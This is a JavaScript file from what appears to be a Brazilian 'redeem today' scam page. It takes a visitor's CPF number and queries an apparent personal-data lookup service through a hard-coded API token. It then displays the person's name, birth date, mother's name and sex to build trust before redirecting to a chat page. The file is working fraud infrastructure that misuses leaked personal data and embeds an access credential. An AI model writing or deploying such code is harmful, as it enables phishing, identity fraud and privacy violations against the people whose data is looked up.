let proximaPagina = "https://resgatarhoje.online/consultando";

document.addEventListener("DOMContentLoaded", function () {
    const cpfInput = document.getElementById('cpf');
    const continueButton = document.getElementById('open-popup');
    const cpfError = document.getElementById('cpf-error');
    let dadosBasicos;

    function formatCPF(cpf) {
        cpf = cpf.replace(/\D/g, '');
        cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
        cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
        cpf = cpf.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
        return cpf;
    }

    function validateCPF(cpf) {
        cpf = cpf.replace(/\D/g, '');
        let sum = 0, remainder;
        for (let i = 0; i < 9; i++) sum += parseInt(cpf.charAt(i)) * (10 - i);
        remainder = 11 - (sum % 11);
        if (remainder >= 10) remainder = 0;
        if (remainder !== parseInt(cpf.charAt(9))) return false;

        sum = 0;
        for (let i = 0; i < 10; i++) sum += parseInt(cpf.charAt(i)) * (11 - i);
        remainder = 11 - (sum % 11);
        if (remainder >= 10) remainder = 0;
        if (remainder !== parseInt(cpf.charAt(10))) return false;

        return true;
    }

    function showCPFErrorMessage() {
        cpfError.style.display = 'block';
        setTimeout(function () {
            cpfError.style.display = 'none';
        }, 3000);
    }

    function updateButtonState() {
        const cpfValue = cpfInput.value.replace(/\D/g, ''); // Remover caracteres não numéricos
        if (cpfValue.length === 11 && validateCPF(cpfValue)) {
            continueButton.removeAttribute('disabled');
            continueButton.classList.add('trocar-cor');
            cpfError.style.display = 'none';
        } else {
            continueButton.setAttribute('disabled', 'true');
            continueButton.classList.remove('trocar-cor');
            if (cpfValue.length >= 11) { // Mostrar a mensagem de erro apenas quando o CPF estiver completo
                cpfError.style.display = 'block';
            } else {
                cpfError.style.display = 'none';
            }
        }
    }

    cpfInput.addEventListener('input', function () {
        cpfInput.value = formatCPF(cpfInput.value);
        updateButtonState();
    });

    continueButton.addEventListener('click', function (event) {
        if (!validateCPF(cpfInput.value)) {
            showCPFErrorMessage();
            event.preventDefault();
            return;
        }

        const popup = document.getElementById("popup");
        const loadingIcon = document.getElementById("loading-icon");
        const successMessage = document.getElementById("success-message");
        const dataContent = document.getElementById("data-content");
        const nextPageButton = document.getElementById("proxima-pagina");

        popup.style.display = "flex";
        continueButton.setAttribute("disabled", "true");
        loadingIcon.style.display = "block";

        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://datatracker.online/OwnData/api.php?token=UUcwdlRsIIPEZrEMuVkoqOsP&modulo=cpf&consulta=' + cpfInput.value + '&foto=off&vacinas=off&vizinhos=off&sus=off');

        xhr.onload = function () {
            if (xhr.status === 200) {
                const response = JSON.parse(xhr.responseText);
                dadosBasicos = response.DadosBasicos;

                document.getElementById("label-1").textContent = dadosBasicos.nome;
                // document.getElementById("label-2").textContent = formatCPF(dadosBasicos.cpf);
                document.getElementById("label-3").textContent = dadosBasicos.dataNascimento;
                document.getElementById("label-4").textContent = dadosBasicos.nomeMae;
                document.getElementById("label-5").textContent = dadosBasicos.sexo.split(' - ')[1];
                localStorage.setItem("nome", dadosBasicos.nome);

                loadingIcon.style.display = "none";
                successMessage.style.display = "none";
                dataContent.style.display = "block";
                nextPageButton.style.display = "block";

              nextPageButton.addEventListener("click", function () {
    window.location.href = "https://chat.novidades.website/mae";
});

                continueButton.removeAttribute("disabled");
            } else {
                console.log('Request failed with status:', xhr.status);
                // Redirecionar para a próxima página se o status for diferente de 200
                window.location.href = proximaPagina;
            }
        };

        xhr.send();
    });

    updateButtonState();
});
